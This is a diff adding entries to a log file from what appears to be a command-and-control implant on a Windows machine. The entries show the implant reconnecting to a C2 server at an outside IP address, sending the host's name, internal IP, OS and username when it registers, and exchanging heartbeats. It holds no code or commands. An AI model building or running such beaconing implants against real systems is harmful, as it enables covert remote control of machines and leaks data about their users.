@@ -278,3 +278,86 @@ danbook\danie
 2025-06-11 22:48:56,841 - INFO - Sending packet PONG data 
 2025-06-11 22:49:22,040 - INFO - Received packet PING data 
 2025-06-11 22:49:22,040 - INFO - Sending packet PONG data 
+2025-06-11 22:49:36,103 - WARNING - WebSocket connection was closed, aborting
+2025-06-11 22:49:36,103 - INFO - Waiting for write loop task to end
+2025-06-11 22:49:36,103 - INFO - Exiting write loop task
+2025-06-11 22:49:36,103 - INFO - Engine.IO connection dropped
+2025-06-11 22:49:36,103 - INFO - Disconnected from C2 server
+2025-06-11 22:49:36,103 - INFO - Attempting to reconnect using WebSocket transport...
+2025-06-11 22:49:36,103 - INFO - Connection failed, new attempt in 1.26 seconds
+2025-06-11 22:49:36,103 - INFO - Exiting read loop task
+2025-06-11 22:49:36,206 - INFO - Connection lost, attempting to reconnect...
+2025-06-11 22:49:36,206 - INFO - Attempting to reconnect using WebSocket transport...
+2025-06-11 22:49:36,206 - INFO - Attempting polling connection to http://178.79.133.66:5000/socket.io/?transport=polling&EIO=4
+2025-06-11 22:49:37,389 - INFO - Attempting polling connection to http://178.79.133.66:5000/socket.io/?transport=polling&EIO=4
+2025-06-11 22:49:39,074 - INFO - HTTP GET request to http://178.79.133.66:5000/socket.io/?transport=polling&EIO=4&t=1749674976.2060142 failed with error HTTPConnectionPool(host='178.79.133.66', port=5000): Max retries exceeded with url: /socket.io/?transport=polling&EIO=4&t=1749674976.2060142 (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001AE7C5874C0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it')).
+2025-06-11 22:49:39,074 - ERROR - Reconnection failed: HTTPConnectionPool(host='178.79.133.66', port=5000): Max retries exceeded with url: /socket.io/?transport=polling&EIO=4&t=1749674976.2060142 (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001AE7C5874C0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
+2025-06-11 22:49:40,252 - INFO - HTTP GET request to http://178.79.133.66:5000/socket.io/?transport=polling&EIO=4&t=1749674977.3891504 failed with error HTTPConnectionPool(host='178.79.133.66', port=5000): Max retries exceeded with url: /socket.io/?transport=polling&EIO=4&t=1749674977.3891504 (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001AE7C8A4460>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it')).
+2025-06-11 22:49:40,252 - INFO - Connection failed, new attempt in 1.84 seconds
+2025-06-11 22:49:42,118 - INFO - Attempting polling connection to http://178.79.133.66:5000/socket.io/?transport=polling&EIO=4
+2025-06-11 22:49:44,079 - INFO - Attempting to reconnect using WebSocket transport...
+2025-06-11 22:49:44,079 - INFO - Attempting polling connection to http://178.79.133.66:5000/socket.io/?transport=polling&EIO=4
+2025-06-11 22:49:44,991 - INFO - HTTP GET request to http://178.79.133.66:5000/socket.io/?transport=polling&EIO=4&t=1749674982.1203036 failed with error HTTPConnectionPool(host='178.79.133.66', port=5000): Max retries exceeded with url: /socket.io/?transport=polling&EIO=4&t=1749674982.1203036 (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001AE7C8A4850>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it')).
+2025-06-11 22:49:44,991 - INFO - Connection failed, new attempt in 4.41 seconds
+2025-06-11 22:49:46,448 - INFO - Polling connection accepted with {'sid': 'XEgITuxqRfpBYz2vAAAA', 'upgrades': ['websocket'], 'pingTimeout': 20000, 'pingInterval': 25000}
+2025-06-11 22:49:46,450 - INFO - Engine.IO connection established
+2025-06-11 22:49:46,451 - INFO - Sending packet MESSAGE data 0{}
+2025-06-11 22:49:46,451 - INFO - Attempting WebSocket upgrade to ws://178.79.133.66:5000/socket.io/?transport=websocket&EIO=4
+2025-06-11 22:49:47,002 - INFO - WebSocket upgrade was successful
+2025-06-11 22:49:47,179 - INFO - Received packet NOOP data 
+2025-06-11 22:49:47,398 - INFO - Received packet MESSAGE data 0{"sid":"Q5DZC9juUTzJt1EEAAAB"}
+2025-06-11 22:49:47,398 - INFO - Namespace / is connected
+2025-06-11 22:49:47,405 - INFO - Connected to C2 server
+2025-06-11 22:49:47,405 - INFO - Registering with C2 server: {'id': 'e536ad4c-23c9-4010-b5e7-715baf6ab833', 'hostname': 'Danbook', 'ip': '192.168.3.35', 'os': 'Windows-10-10.0.22631-SP0', 'user': 'danie'}
+2025-06-11 22:49:47,406 - INFO - Emitting event "register" [/]
+2025-06-11 22:49:47,406 - INFO - Sending packet MESSAGE data 2["register",{"id":"e536ad4c-23c9-4010-b5e7-715baf6ab833","hostname":"Danbook","ip":"192.168.3.35","os":"Windows-10-10.0.22631-SP0","user":"danie"}]
+2025-06-11 22:49:47,588 - INFO - Received packet MESSAGE data 2["implants_update",{"e536ad4c-23c9-4010-b5e7-715baf6ab833":{"hostname":"Danbook","ip":"192.168.3.35","os":"Windows-10-10.0.22631-SP0","user":"danie","connected":true,"last_seen":"2025-06-11T20:49:47.621134","last_activity":"Connected","sid":"Q5DZC9juUTzJt1EEAAAB"}}]
+2025-06-11 22:49:47,590 - INFO - Received event "implants_update" [/]
+2025-06-11 22:49:47,807 - INFO - Received packet MESSAGE data 2["registered",{"status":"success"}]
+2025-06-11 22:49:47,807 - INFO - Received event "registered" [/]
+2025-06-11 22:49:47,807 - INFO - Successfully registered with C2 server
+2025-06-11 22:49:49,415 - INFO - Connection failed, new attempt in 5.13 seconds
+2025-06-11 22:49:54,559 - INFO - Connection failed, new attempt in 4.54 seconds
+2025-06-11 22:49:55,515 - INFO - Sending packet CLOSE data None
+2025-06-11 22:49:55,515 - INFO - Engine.IO connection dropped
+2025-06-11 22:49:55,515 - INFO - Exiting write loop task
+2025-06-11 22:49:55,515 - INFO - Disconnected from C2 server
+2025-06-11 22:49:55,515 - INFO - Attempting to reconnect using WebSocket transport...
+2025-06-11 22:49:55,687 - WARNING - WebSocket connection was closed, aborting
+2025-06-11 22:49:55,687 - INFO - Waiting for write loop task to end
+2025-06-11 22:49:55,687 - INFO - Exiting read loop task
+2025-06-11 22:49:55,702 - INFO - Shutting down implant...
+2025-06-11 22:49:55,702 - INFO - Reconnect task aborted
+2025-06-11 22:50:04,645 - INFO - Connecting to C2 server at http://178.79.133.66:5000 using WebSocket transport
+2025-06-11 22:50:04,645 - INFO - Attempting polling connection to http://178.79.133.66:5000/socket.io/?transport=polling&EIO=4
+2025-06-11 22:50:05,001 - INFO - Polling connection accepted with {'sid': 'rvsoNeiqKJaCTEewAAAG', 'upgrades': ['websocket'], 'pingTimeout': 20000, 'pingInterval': 25000}
+2025-06-11 22:50:05,001 - INFO - Engine.IO connection established
+2025-06-11 22:50:05,001 - INFO - Sending packet MESSAGE data 0{}
+2025-06-11 22:50:05,005 - INFO - Attempting WebSocket upgrade to ws://178.79.133.66:5000/socket.io/?transport=websocket&EIO=4
+2025-06-11 22:50:05,506 - INFO - WebSocket upgrade was successful
+2025-06-11 22:50:05,680 - INFO - Received packet NOOP data 
+2025-06-11 22:50:05,882 - INFO - Received packet MESSAGE data 0{"sid":"tMVYXPmfSngDgjdmAAAH"}
+2025-06-11 22:50:05,882 - INFO - Namespace / is connected
+2025-06-11 22:50:05,882 - INFO - Connected to C2 server
+2025-06-11 22:50:05,882 - INFO - Registering with C2 server: {'id': '5b453f2e-d0a5-4919-8ff6-32b81c9e4538', 'hostname': 'Danbook', 'ip': '192.168.3.35', 'os': 'Windows-10-10.0.22631-SP0', 'user': 'danie'}
+2025-06-11 22:50:05,882 - INFO - Emitting event "register" [/]
+2025-06-11 22:50:05,882 - INFO - Sending packet MESSAGE data 2["register",{"id":"5b453f2e-d0a5-4919-8ff6-32b81c9e4538","hostname":"Danbook","ip":"192.168.3.35","os":"Windows-10-10.0.22631-SP0","user":"danie"}]
+2025-06-11 22:50:06,070 - INFO - Received packet MESSAGE data 2["implants_update",{"5b453f2e-d0a5-4919-8ff6-32b81c9e4538":{"hostname":"Danbook","ip":"192.168.3.35","os":"Windows-10-10.0.22631-SP0","user":"danie","connected":true,"last_seen":"2025-06-11T20:50:06.115368","last_activity":"Connected","sid":"tMVYXPmfSngDgjdmAAAH"}}]
+2025-06-11 22:50:06,075 - INFO - Received event "implants_update" [/]
+2025-06-11 22:50:06,280 - INFO - Received packet MESSAGE data 2["registered",{"status":"success"}]
+2025-06-11 22:50:06,295 - INFO - Received event "registered" [/]
+2025-06-11 22:50:06,295 - INFO - Successfully registered with C2 server
+2025-06-11 22:50:30,008 - INFO - Received packet PING data 
+2025-06-11 22:50:30,015 - INFO - Sending packet PONG data 
+2025-06-11 22:50:55,201 - INFO - Received packet PING data 
+2025-06-11 22:50:55,201 - INFO - Sending packet PONG data 
+2025-06-11 22:51:20,364 - INFO - Received packet PING data 
+2025-06-11 22:51:20,380 - INFO - Sending packet PONG data 
+2025-06-11 22:51:45,623 - INFO - Received packet PING data 
+2025-06-11 22:51:45,623 - INFO - Sending packet PONG data 
+2025-06-11 22:52:10,793 - INFO - Received packet PING data 
+2025-06-11 22:52:10,806 - INFO - Sending packet PONG data 
+2025-06-11 22:52:36,012 - INFO - Received packet PING data 
+2025-06-11 22:52:36,012 - INFO - Sending packet PONG data 
+2025-06-11 22:53:01,200 - INFO - Received packet PING data 
+2025-06-11 22:53:01,200 - INFO - Sending packet PONG data 
